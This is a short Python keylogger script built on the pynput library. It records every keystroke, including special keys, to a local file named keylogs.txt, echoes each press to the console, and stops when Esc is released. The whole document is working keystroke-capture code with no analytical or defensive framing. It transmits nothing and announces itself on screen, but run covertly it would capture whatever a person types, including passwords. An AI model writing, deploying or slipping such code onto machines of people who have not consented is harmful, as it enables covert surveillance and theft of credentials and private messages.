import pynput

from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(str(key.char))
        print(f'Alphanumeric key pressed: {key}')
    except AttributeError:
        if key == Key.space:
            with open("keylogs.txt", "a") as f:
                f.write(' ')
            print('Spacebar pressed')
        else:
            with open("keylogs.txt", "a") as f:
                f.write(f'\n{key}\n')
            print(f'Special key pressed: {key}')

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()